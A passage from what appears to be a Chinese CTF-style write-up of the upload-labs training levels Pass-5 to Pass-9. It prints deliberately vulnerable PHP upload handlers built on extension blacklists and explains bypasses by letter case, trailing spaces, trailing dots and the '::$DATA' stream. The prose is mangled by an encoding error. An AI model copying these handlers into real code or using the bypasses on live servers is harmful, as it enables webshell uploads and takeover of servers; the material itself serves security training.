class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">123456789101112131415161718192021222324252627</span></span><br></pre></td></tr></table></figure><p>ç›¸æ¯”äºpass-4ï¼Œè¿‡æ»¤äº†.htaccessï¼Œä½†å°†åç¼€è½¬æ¢ä¸ºå°å†™å»æ‰äº†ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨å¤§å°ç»•è¿‡<br><img src="https://img-blog.csdnimg.cn/2019061821314398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20190618213222393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="Pass-6-ç©ºæ ¼ç»•è¿‡"><a href="#Pass-6-ç©ºæ ¼ç»•è¿‡" class="headerlink" title="Pass-6-ç©ºæ ¼ç»•è¿‡"></a>Pass-6-ç©ºæ ¼ç»•è¿‡</h2><p><strong>æºç ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">123456789101112131415161718192021222324252627</span></span><br></pre></td></tr></table></figure><p>ç›¸æ¯”äºå‰ä¸¤é¢˜ï¼Œè¿™é¢˜æ²¡æœ‰å¯¹åç¼€åè¿›è¡Œå»ç©ºï¼Œå› æ­¤å¯ä»¥åœ¨åç¼€ååŠ ç©ºæ ¼ç»•è¿‡<br><img src="https://img-blog.csdnimg.cn/20190618213558104.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20190618213634557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="Pass-7-ç‚¹ç»•è¿‡"><a href="#Pass-7-ç‚¹ç»•è¿‡" class="headerlink" title="Pass-7-ç‚¹ç»•è¿‡"></a>Pass-7-ç‚¹ç»•è¿‡</h2><p><strong>æºç ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">123456789101112131415161718192021222324252627</span></span><br></pre></td></tr></table></figure><p>æ²¡æœ‰å¯¹åç¼€åæœ«å°¾çš„ç‚¹è¿›è¡Œå¤„ç†ï¼Œåˆ©ç”¨windowsç‰¹æ€§ï¼Œä¼šè‡ªåŠ¨å»æ‰åç¼€åä¸­æœ€åçš„â€.â€ï¼Œå¯åœ¨åç¼€åä¸­åŠ â€.â€ç»•è¿‡ï¼š<br><img src="https://img-blog.csdnimg.cn/20190618214054814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20190618214120354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="Pass-8-DATAç»•è¿‡"><a href="#Pass-8-DATAç»•è¿‡" class="headerlink" title="Pass-8-::$DATAç»•è¿‡"></a>Pass-8-::$DATAç»•è¿‡</h2><p><strong>æºç ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">123456789101112131415161718192021222324252627</span></span><br></pre></td></tr></table></figure><p>æ²¡æœ‰å¯¹åç¼€åä¸­çš„â€™::$DATAâ€™è¿›è¡Œè¿‡æ»¤ã€‚åœ¨php+windowsçš„æƒ…å†µä¸‹ï¼šå¦‚æœæ–‡ä»¶å+â€::$DATAâ€ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€å.ä¸”ä¿æŒâ€::$DATAâ€ä¹‹å‰çš„æ–‡ä»¶åã€‚åˆ©ç”¨windowsç‰¹æ€§ï¼Œå¯åœ¨åç¼€åä¸­åŠ â€ ::$DATAâ€ç»•è¿‡ï¼š<br><img src="https://img-blog.csdnimg.cn/20190618215039848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20190618215110311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="Pass-9-ç‚¹-ç©ºæ ¼-ç‚¹ç»•è¿‡"><a href="#Pass-9-ç‚¹-ç©ºæ ¼-ç‚¹ç»•è¿‡" class="headerlink" title="Pass-9-ç‚¹+ç©ºæ ¼+ç‚¹ç»•è¿‡"></a>Pass-9-ç‚¹+ç©ºæ ¼+ç‚¹ç»•è¿‡</h2><p><strong>æºç ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»£ç å…ˆæ˜¯å»é™¤æ–‡ä»¶åå‰åçš„ç©ºæ 